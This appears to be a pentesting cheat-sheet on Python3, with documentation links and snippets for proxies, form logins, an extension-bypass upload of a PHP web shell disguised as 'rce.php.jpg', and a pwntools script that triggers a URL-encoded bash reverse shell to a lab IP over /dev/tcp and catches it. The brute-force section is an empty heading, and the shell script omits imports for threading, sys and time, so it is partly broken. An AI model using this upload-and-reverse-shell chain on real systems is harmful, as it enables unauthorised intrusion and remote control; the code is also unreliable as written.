# Pentesting with Python3

## Style Guide for Python Code

If you want to write good code then read this:

{% embed url="https://www.python.org/dev/peps/pep-0008/" %}

## Python3 Library

The best way to learn commands or code is to read the official documentation:

{% embed url="https://docs.python.org/3/library/index.html" %}

## Modules/Library

Here are the most common modules or libraries that are most often used in scripts or exploits.

### pwntools

{% embed url="https://docs.pwntools.com/en/stable/" %}

### requests

{% embed url="https://docs.python-requests.org/en/master/" %}

### os

{% embed url="https://docs.python.org/3/library/os.html" %}

### sys

{% embed url="https://docs.python.org/3/library/sys.html" %}

### time

{% embed url="https://docs.python.org/3/library/time.html" %}

### urllib

{% embed url="https://docs.python.org/3/library/urllib.html" %}

### struct

{% embed url="https://docs.python.org/3/library/struct.html" %}

## HTTP Proxies

We may need proxies for debugging or troubleshooting, the following code is an example of this:

```python
#!/bin/python3

import requests

proxies = {
    "http": "http://127.0.0.1:8080",
}

s = requests.Session()
s.proxies.update(proxies)
```

## HTTP Login

### HTML Form

An example of a login form may look like the following code:

```python
#!/bin/python3

import requests

# Session
s = requests.Session()

login_url = 'http://10.10.10.185/login.php'
login_parameters = {"username": "username_here", "password": "password_here"}
s.post(login_url, data=login_parameters, allow_redirects=True)
```

## HTTP Login Bruteforce

### Password Bruteforce

A very simple password brute force script on HTTP non SSL/TLS can be the following:

## HTTP File Upload

### Multipart-Encoded File

Some servers are configured to upload files using one or more Content-Disposition headers:

```python
#!/bin/python3

import requests
  
upload_url = "http://10.10.10.10/upload.php"

"""
Content-Disposition: form-data; name="image"; filename="rce.php.jpg"
Content-Type: image/jpeg
Content-Disposition: form-data; name="submit"
Upload Image
"""
upload_image = {
    "image": ("rce.php.jpg", open("rce.jpg", "rb"), "image/jpeg"),
    "submit": (None, "Upload Image"),
}

requests.post(
    upload_url,
    files=upload_image,
)

print("[+] Uploaded the file")
```

## Interactive Shell with pwn

This is a way to receive an interactive shell via a socket, however, you may have problems establishing a TTY/PTY shell:

```python
#!/bin/python3

import requests
from pwn import log, context, listen

def foothold():
    # Reverse Shell
    rce_url = "http://10.10.10.185/images/uploads/rce.php.jpg"
    payload = "?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.41%2F1234%200%3E%261%27"
    requests.get(rce_url + payload)


if __name__ == "__main__":
    try:
        threading.Thread(target=foothold, args=()).start()
    except Exception as e:
        log.error(str(e))
    
    listen_port=1234
    
    p1 = log.progress("Foothold")
    p1.status("Gaining access to the system.")
    
    shell = listen(listen_port, timeout=5).wait_for_connection()
    
    # Check if the socket has been established
    if shell.sock is None:
        log.failure("We couldn't connect to the system")
        sys.exit()
    else:
        log.success("We have access to the system as the user www-data")
        time.sleep(1)
    
    shell.interactive()
```

